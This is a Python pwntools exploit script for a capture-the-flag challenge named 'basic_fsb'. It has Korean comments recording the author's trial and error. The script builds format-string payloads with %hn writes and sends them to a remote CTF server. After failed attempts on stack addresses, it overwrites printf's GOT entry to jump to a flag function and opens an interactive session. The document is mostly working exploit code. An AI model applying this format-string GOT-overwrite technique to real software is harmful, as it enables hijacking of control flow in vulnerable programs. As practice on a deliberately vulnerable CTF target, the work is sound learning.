# -*- coding: utf-8 -*-
from pwn import * 

#p = process("basic_fsb")
p = remote("ctf.j0n9hyun.xyz",3002)

# fgets로 입력을 받은 버퍼위치는 ebp-0x808, snprintf로 저장하는 위치는 0x408. 
# 그 다음 호출되는 printf 함수는 서식문자 없이 바로 408위치에 이는 문자열을 출력시킨다. 
# flag 함수의 주소가 주어져 있다. 0x080485b4
# 맨처음에 fgets함수로 입력을 받을때 0x400만큼만 입력 받는다. 
# fsb가 뭐였지, 공격 목표 위치 주소값을 입력하고, 내가 원하는 주소값은 바이트 수를 계산해 채워넣는거였다. 
# 이떄, 순서상으로 %n 문자열이 출력할 메모리 위치에 입력한 주소값이 있어야 한다. 
# 페이로드의 구성 순서는 문자열-목표주소-서식문자 순이 되어야 한다. 
# FFFFD4FC => FFFFD4FC , FFFFD4FE   / 0x080485b4 => 0804 , 85b4 로 구분해서 넣자.
# AAAA + 주소1 + AAAA + 주소2 + %c %hn %c %hn => 맨앞은 총 16바이트 -> 2036 , 그 뒤는 34228-2036 = 32192
# AAAA + FFFFD4FC + AAAA + FFFFD4FE + %2036c + %hn + %32192c + %hn 순으로 구성. 

payload = p32(0xFFFFD4eC) + "AAAA" + p32(0xFFFFD4eE)
payload += "%2036c" + "%hn" + "%32192c" + "%hn" 


#자꾸 터지는데, snprintf 함수에 진입했을때 터지는게 보인다. 
# 원인은, 0xf7d88bc2 <vfprintf+9666>:  mov    WORD PTR [eax],dx 어셈에서 eax 가 유효하지 않은 주소라면서 터지더라.
# 그 상황에서 eax에 들어가 있는건 내가 앞에 넣어줬던 주소 위치인데, 해당 메모리 주소에 접근할 수 없었다. 
# 그럼 다른 주소위치를 공격해봐야 된다는 이야기. 
# vuln 함수 eip가 조작이 안되니, main 함수 eip를 건드려보자. 0xffffd4fc . 0xffffd4fe 도 안되네..


payload = p32(0xffffd4fc) + "AAAA" + p32(0xffffd4fe)
payload += "%2036c" + "%hn" + "%32192c" + "%hn"


# 원인을 찾았다고 해야되나... 스택의 주소가 계속 바뀌고 있다. 스택을 노리는게 아닌가 그러면?
# 생각을 좀만 더 해보면, snprintf 함수를 호출할때 이미 fsb가 발생하는 상황이다.
# 그 다음에 호출되는 printf 함수의 got 를 조작해보라는 이야기인가? got 위치는 0x804a00c 이다. 
# 오 된다. 주소 값만 제대로 맞춰주면 될거같다. 
# 결과적으로, eip가 아니라 printf 함수의  got 주소에 대한 fsb를 하라는 이야기였다. 신박한 문제다. 

payload = p32(0x804a00e) + "AAAA" + p32(0x804a00c)
payload += "%2040c" + "%hn" + "%32176c" + "%hn" # 0804 , 85b4

pause()
p.sendlineafter(" : ",payload)
p.interactive()

